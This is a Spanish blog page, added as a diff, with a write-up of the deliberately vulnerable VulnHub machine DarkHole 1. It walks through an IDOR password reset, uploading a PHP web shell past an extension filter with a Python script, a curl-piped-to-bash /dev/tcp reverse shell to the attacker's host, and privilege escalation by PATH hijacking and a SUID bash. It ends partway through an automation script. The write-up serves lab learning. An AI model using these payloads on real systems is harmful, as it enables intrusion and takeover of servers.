@@ -1,0 +1,1112 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Dark hole 1 VulnHub Write-up - grafis Blog</title>
+<meta name="description" content="En este artículo comparto el write up de la máquina Dark hole 1 de VulnHub">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="grafis Blog">
+<meta property="og:title" content="Dark hole 1 VulnHub Write-up">
+<meta property="og:url" content="http://localhost:4000/DarkHole_1/">
+
+
+  <meta property="og:description" content="En este artículo comparto el write up de la máquina Dark hole 1 de VulnHub">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/imagenes/VulnHub/vulnhub_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-02-20T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/DarkHole_1/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "grafis",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="grafis Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Dark hole 1 VulnHub Write-up</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="grafis" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">grafis</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Estudiante de Ingeniería Civil en Informática y Telecomunicaciones
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/mirko-babic-vel%C3%A1squez-4979bb219" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/grafis0" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Dark hole 1 VulnHub Write-up">
+    <meta itemprop="description" content="En este artículo comparto el write up de la máquina Dark hole 1 de VulnHub">
+    <meta itemprop="datePublished" content="February 20, 2023">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Dark hole 1 VulnHub Write-up
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2023-02-20T00:00:00-05:00">February 20, 2023 </time> 
+          
+          
+        </p>
+        <h1 id="resumen">
+<a href="#header-2"></a>Resumen</h1>
+
+<p>Saludos, en esta oportunidad vamos a resolver la máquina de <strong>VulnHub</strong> llamada <strong>DarkHole 1</strong>, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:</p>
+
+<ul>
+  <li>Enumeración del sistema.</li>
+  <li>Abuso de mala implementación de sesiones.</li>
+  <li>Subida de archivo malicioso php a la web (extension filter bypass).</li>
+  <li>Abuso de binario SUID (path hijacking).</li>
+  <li>Abuso de archivo SUID.</li>
+  <li>Automatización de la intrusión con python.</li>
+</ul>
+
+<h2 id="reconocimiento-y-enumeración">
+<a href="#header-2"></a>Reconocimiento y Enumeración</h2>
+
+<p>En primer lugar, se comprueba la correcta conexión con la máquina utilizando <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 192.168.233.129
+
+PING 192.168.233.129 (192.168.233.129) 56(84) bytes of data.
+64 bytes from 192.168.233.129: icmp_seq=1 ttl=64 time=5.95 ms
+</code></pre></div></div>
+<p>Se observa que existe una correcta conexión con la máquina.</p>
+
+<p>Para realizar un reconocimiento activo se utilizará la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro <code class="language-plaintext highlighter-rouge">-sS</code> el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- -sS -open 192.168.233.129 -oG Port
+</code></pre></div></div>
+<p>Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+<p>Realizamos un escaneo de los servicios expuestos utilizando <code class="language-plaintext highlighter-rouge">nmap</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sCV -p22,80 192.168.233.129
+</code></pre></div></div>
+
+<p>Como resultado del escaneo tenemos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e450d9505d913050e9b57dcab051db74 (RSA)
+|   256 730c76866063060021c236203b99c1f7 (ECDSA)
+|_  256 54534c3f4f3a26f602aa9a24ea1b928c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: DarkHole
+MAC Address: 00:0C:29:16:4F:CB (VMware)
+</code></pre></div></div>
+
+<p>Observamos un servicio http, vamos a utilizar whatweb para enumerar información:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 192.168.233.129
+http://192.168.233.129 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.233.129], Title[DarkHole]
+</code></pre></div></div>
+
+<p>Vamos a ver la web:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_1.png" alt=""></p>
+
+<p>Observamos la página, el botón no hace nada, sin embargo, la sección de login si:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_2.png" alt=""></p>
+
+<p>Vemos una sección de registro vamos a intentar registrarnos:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_3.png" alt=""></p>
+
+<p>Iniciamos sesión:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_4.png" alt=""></p>
+
+<p>Luego, de iniciar sesión vemos lo siguiente:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_5.png" alt=""></p>
+
+<p>Tenemos algunas partes para cambiar información, pero si miramos la <strong>url</strong>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.233.129/dashboard.php?id=2
+</code></pre></div></div>
+
+<p>Vemos que se está empleando un id, esto debe ser para identificar los usuarios, como somos el dos es lógico pensar que el uno existe, vamos a intentar ingresar:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_6.png" alt=""></p>
+
+<p>Sin embargo, no podemos.</p>
+
+<h2 id="explotación">
+<a href="#header-2"></a>Explotación</h2>
+
+<p>Vamos a probar las opciones de cambio de contraseña, vamos a interceptar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code>:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_7.png" alt=""></p>
+
+<p>Vemos que la petición por post se envía a través con un <strong>id</strong>, que representa al usuario, así que vamos a cambiar este <strong>id</strong> para el usuario 1:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_8.png" alt=""></p>
+
+<p>Si esto funcionó, debimos cambiarle la contraseña al <strong>id</strong> 1, podríamos pensar que este identificador corresponde al de administrador, pues es el primer usuario en crearse, vamos a intentar iniciar sesión con admin:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_9.png" alt=""></p>
+
+<p>Al intentarlo:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_10.png" alt=""></p>
+
+<p>Vemos que hemos iniciado sesión correctamente, y existe un panel donde podemos un archivo.</p>
+
+<p>Si el sistema para subir archivos no se encuentra hecho correctamente podríamos ser capaces de subir un archivo php malicioso, que nos permita ejectuar comandos en la máquina, vamos a intentar subir un txt con la palabra hola:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_11.png" alt=""></p>
+
+<p>Al enviarlo:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_12.png" alt=""></p>
+
+<p>Vemos que se ha enviado correctamente, sin embargo, no tenemos una forma de saber donde se están almacenando los archivos, para ellos a fuzzear directorios para ver si existe algún directorio que nos sirva:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://192.168.233.129/FUZZ
+</code></pre></div></div>
+<p>Y encontramos algo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000366:   301        9 L      28 W       319 Ch      "upload"
+</code></pre></div></div>
+
+<p>Existe un directorio <strong>upload</strong>, vamos a verlo:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_13.png" alt=""></p>
+
+<p>Aquí se guardan las cosas que subimos, podemos observar que está nuestro archivo de prueba:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_14.png" alt=""></p>
+
+<p>Vamos a intentar subir un archivo php malicioso que nos permita controlar mediante una variable <strong>cmd</strong> los comandos que queremos ejectuar en el sistema:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="mf">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="mf">.</span> <span class="s2">"&lt;/pre&gt;"</span><span class="p">;</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Vamos a poner esto en nuestro archivo de subirlo:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_15.png" alt=""></p>
+
+<p>Al subirlo:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_16.png" alt=""></p>
+
+<p>Nos dice que no permite la subida de esos archivos.</p>
+
+<p>Podemos pensar algunas maneras de realizar un bypass, en caso de que este sea la verificación de la extensión, por ejemplo, en la web de <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">HackTricks</a> podemos ver que existen diferentes extensiones que podemos utilizar para pasar por el filtro, vamos a probarlas todas, sin embargo, como son bastantes lo haremos mediante python para hacerlo menos tedioso.</p>
+
+<p>En primer lugar, vamos a definir nuestras variables:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">url</span> <span class="o">=</span> <span class="s">"http://192.168.233.129/dashboard.php?id=1"</span>
+<span class="n">urlLogin</span><span class="o">=</span> <span class="s">"http://192.168.233.129/login.php"</span>
+<span class="n">extensions</span><span class="o">=</span> <span class="p">[</span><span class="s">".php"</span><span class="p">,</span> <span class="s">".php2"</span><span class="p">,</span> <span class="s">".php3"</span><span class="p">,</span> <span class="s">".php4"</span><span class="p">,</span> <span class="s">".php5"</span><span class="p">,</span> <span class="s">".php6"</span><span class="p">,</span> <span class="s">".php7"</span><span class="p">,</span> <span class="s">".phps"</span><span class="p">,</span> <span class="s">".phps"</span><span class="p">,</span> <span class="s">".pht"</span><span class="p">,</span> <span class="s">".phtm"</span><span class="p">,</span> <span class="s">".phtml"</span><span class="p">,</span> <span class="s">".pgif"</span><span class="p">,</span> <span class="s">".shtml"</span><span class="p">,</span> <span class="s">".htaccess"</span><span class="p">,</span> <span class="s">".phar"</span><span class="p">,</span> <span class="s">".inc"</span><span class="p">,</span> <span class="s">".hphp"</span><span class="p">,</span> <span class="s">".ctp"</span><span class="p">,</span> <span class="s">".module"</span><span class="p">]</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Luego, tenemos nuestra función para iniciar sesión:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+
+    <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span> 
+        <span class="s">"username"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
+        <span class="s">"password"</span><span class="p">:</span> <span class="s">"test"</span>
+     <span class="p">}</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">urlLogin</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">post_data</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Finalemnte, tenemos nuestra función que subirá nuestro payload con las diferentes extesiones que definimos anteriormente:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">upload</span><span class="p">():</span>
+
+    <span class="k">for</span> <span class="n">ext</span> <span class="ow">in</span> <span class="n">extensions</span><span class="p">:</span>
+
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"""  &lt;?php echo "&lt;pre&gt;" . shell_exec($_REQUEST['cmd']) . "&lt;/pre&gt;"; ?&gt; """</span> 
+
+        <span class="n">files</span>  <span class="o">=</span> <span class="p">{</span><span class="s">'fileToUpload'</span><span class="p">:(</span><span class="sa">f</span><span class="s">'shell</span><span class="si">{</span><span class="n">ext</span><span class="si">}</span><span class="s">'</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+            <span class="p">}</span>
+
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">files</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Al ejecutar este código, nos vamos a ver las uploads:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_17.png" alt=""></p>
+
+<p>Observamos que se han subido los archivos con todas las extensiones, vamos a revisarlos uno por uno.</p>
+
+<p>Después de revisarlos y ver que todos no están siendo interpretados, llegamos al <strong>.phtml</strong>:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_18.png" alt=""></p>
+
+<p>Puede ser que el código se esté interpretando, vamos a intentar ejectuar <strong>whoami</strong>:</p>
+
+<p><img src="/imagenes/DarkHole1/darkhole1_19.png" alt=""></p>
+
+<p>Vemos que tenemos ejecución remota de comandos, vamos a crear entonces una conexión hacia nuestra máquina para ganar acceso al sistema.</p>
+
+<p>Vamos a compartir un archivo index.html malicioso, que haciendo uso del /dev/tcp nos envíe una conexión hacia nuestra máquina, estaremos compartiendo este archivo haciendo uso de un servidor http con python, mientras estaremos conexión con netcat. Dentro del parámetro <strong>cmd</strong> haremos una petición a nuestro recurso y lo vamos a pipear con bash para así ejecutar su contenido.</p>
+
+<p>El archivo html malicioso es este:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/192.168.233.128/1234 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Vamos a dejar abiertos el servidor en python y el netcat.</p>
+
+<p>Vamos a ingresar la petición a la página:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>192.168.233.129/upload/shell.phtml?cmd=curl%20192.168.233.128%20|%20bash
+</code></pre></div></div>
+<p>Si vemos nuestro servidor en python:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.233.129 - - [20/Feb/2023 15:21:53] "GET / HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Vemos la petición get, y si vemos netcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.233.128] from (UNKNOWN) [192.168.233.129] 60212
+bash: cannot set terminal process group (88930): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.0$ whoami
+whoami
+www-data
+</code></pre></div></div>
+<p>Hemos ganado acceso al sistema, sin embargo, no tenemos privilegio alguno, vamos a tener que escalar.</p>
+
+<h2 id="escalada-de-privilegios">
+<a href="#header-2"></a>Escalada de privilegios</h2>
+
+<p>Antes de todo necesitamos una tty decente, asi que vamos a hacer lo siguiente:</p>
+<ul>
+  <li>script /dev/null -c bash</li>
+  <li>control + z</li>
+  <li>stty ray -echo; fg</li>
+  <li>reset xterm</li>
+  <li>export TERM=xterm</li>
+  <li>export SHELL=bash</li>
+  <li>stty rows X columns Y (dependiendo de tu stty size)</li>
+</ul>
+
+<p>Bien, con la consola lista vamos a escalar privilegios.</p>
+
+<p>En primer lugar, revisamos todos los archivos de la web por si encontramos algo, pero no vamos a encontrar nada.</p>
+
+<p>Vamos a dirigirnos a los directorios de los usuarios por si encontramos información:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ cd /home
+bash-5.0$ ls
+darkhole  john
+bash-5.0$ cd john/
+bash-5.0$ ls
+file.py  password  toto  user.txt
+</code></pre></div></div>
+
+<p>Vemos diferentes archivos dentro del directorio de <strong>john</strong>, vamos a ver los permisos:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ ls -la
+total 72
+drwxrwxrwx 5 john john      4096 Feb 20 17:02 .
+drwxr-xr-x 4 root root      4096 Jul 16  2021 ..
+-rw------- 1 john john      2139 Feb 20 17:00 .bash_history
+-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout
+-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrc
+drwx------ 2 john john      4096 Jul 17  2021 .cache
+drwxrwxr-x 3 john john      4096 Jul 17  2021 .local
+-rw------- 1 john john        37 Jul 17  2021 .mysql_history
+-rw-r--r-- 1 john john       807 Jul 16  2021 .profile
+drwxrwx--- 2 john www-data  4096 Jul 17  2021 .ssh
+-rwxrwx--- 1 john john        43 Feb 20 17:02 file.py
+-rwxrwx--- 1 john john         8 Jul 17  2021 password
+-rwsr-xr-x 1 root root     16784 Jul 17  2021 toto
+-rw-rw---- 1 john john        24 Jul 17  2021 user.txt
+</code></pre></div></div>
+
+<p>Vemos un archivo password que no podemos ver, existe un archivo toto que podemos ejecutar:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ file toto
+toto: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f55e5cb083b2207ed23fc83f2dbf1cba931c868, for GNU/Linux 3.2.0, not stripped
+</code></pre></div></div>
+
+<p>Vemos que es un binario SUID, vamos a ver que hace:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./toto
+uid=1001(john) gid=33(www-data) groups=33(www-data)
+</code></pre></div></div>
+
+<p>Si abrimos el binario, por supuesto es ilegible, pero si utilizamos strings podemos ver palabras:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ strings toto
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+setuid
+system
+__cxa_finalize
+setgid
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+:*3$"
+GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
+</code></pre></div></div>
+
+<p>Vemos un par de cosas interesantes, pero nada crítico.</p>
+
+<p>Vemos que este binario se comporta como el <strong>id</strong>, vamos a hacer una prueba, pues puede ser que este binario este utilizando este comando de forma relativa y no absoluta, en este caso podríamos realizar un cambio de path, en donde vamos a hacer que este archivo se ejecute y busque el comando <strong>id</strong> y use el que nosotros queremos, como el usuario que lo ejecuta es root, como es SUID, deberíamos ganar acceso como el. Lo haremos de la siguiente forma.</p>
+
+<p>Vamos a ir al directorio <strong>tmp</strong> y crearemos un archivo, el cual se ejecutaría como si fuera un archivo en bash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ cd /tmp
+bash-5.0$ echo "bash -p" &gt; id
+bash-5.0$ cat id
+bash -p
+</code></pre></div></div>
+
+<p>Vemos que hemos creado un archivo id, el cual en caso de ejecutarse nos daría una bash con privilegios.</p>
+
+<p>Vamos a darle permisos de ejecución.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ chmod +x id
+</code></pre></div></div>
+<p>Bien, ahora tenemos esto listo, sin embargo, como haces que ejecute este archivo? para eso haremos una modifición a la variable de entorno PATH, en donde se empiezan a buscar todos los binarios, para ello vamos a introducir la dirección tmp como primera opción, por lo tanto, en caso de que se esté aplicando una ruta relativa, vaya al path y ejecute nuestro binario, pues es el primero que va a encontrar.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ export PATH=/tmp:$PATH 
+bash-5.0$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+</code></pre></div></div>
+
+<p>Bien, con todo esto listo vamos a probarlo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ ./toto
+bash-5.0$ whoami
+john
+</code></pre></div></div>
+
+<p>Vemos que ahora somos john, sin embargo, deberiamos ser root. Esto paso debido a que si vemos bien los strings del archivo toto se le hace un setuid y setgid:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>setuid
+system
+__cxa_finalize
+setgid
+</code></pre></div></div>
+
+<p>En esta parte debe estar dandole la propiedad a john. Sin embargo, nos sirve pues ahora tenemos más privilegios.</p>
+
+<p>Vamos a revisar el archivo password que no podíamos antes:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ cat password
+root123
+</code></pre></div></div>
+
+<p>Vemos la contraseña, debe ser de nuestro usuario. Vamos a ver nuestro privilegios:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ sudo -l
+[sudo] password for john: 
+Matching Defaults entries for john on darkhole:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on darkhole:
+    (root) /usr/bin/python3 /home/john/file.py
+</code></pre></div></div>
+
+<p>Vemos que podemos ejectuar como root el archivo file.py, vamos a verlo.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ ls -la
+total 72
+drwxrwxrwx 5 john john      4096 Feb 20 17:02 .
+drwxr-xr-x 4 root root      4096 Jul 16  2021 ..
+-rw------- 1 john john      2485 Feb 20 20:34 .bash_history
+-rw-r--r-- 1 john john       220 Jul 16  2021 .bash_logout
+-rw-r--r-- 1 john john      3771 Jul 16  2021 .bashrc
+drwx------ 2 john john      4096 Jul 17  2021 .cache
+-rwxrwx--- 1 john john        43 Feb 20 17:02 file.py
+</code></pre></div></div>
+
+<p>Vemos que el archivo file.py nos pertenece a nosotros, por lo tanto, ganar acceso como root será muy sencillo.</p>
+
+<p>Para ello vamos a brir el archivo y utilizando la libraria os vamos a ejecutar un comando en el sistema, lo que podemos hacer es asignarle el privilegio SUID a la bash de root, para que podamos convertinos en él, como el archivo lo está ejecutando root haremos lo siguiente:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"chmod +s /bin/bash"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Y lo guardamos.</p>
+
+<p>Vamos a ejecutarlo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ sudo /usr/bin/python3 /home/john/file.py
+</code></pre></div></div>
+<p>Si vemos los permisos de /bin/bash:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ ls -la /bin/bash
+-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+</code></pre></div></div>
+
+<p>Vemos que ahora es SUID, vamos a ejecutarlo:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0$ bash -p
+bash-5.0# whoami
+root
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.0# cat root.txt
+DarkHole{You_Are_Legend}
+</code></pre></div></div>
+
+<p>¡Listo!, nos convertimos en root, hemos terminado la máquina.</p>
+
+<p>Sin embargo, como un extra como a realizar la automatización de la intrusión en python.</p>
+
+<p>En primer lugar, vamos a definir las variables que utilizaremos:</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ipHost</span><span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">ipVic</span><span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="n">urlIndex</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">ipVic</span><span class="si">}</span><span class="s">/dashboard.php?id=2'</span> <span class="c1"># Modificar id si ya has creado usuarios.
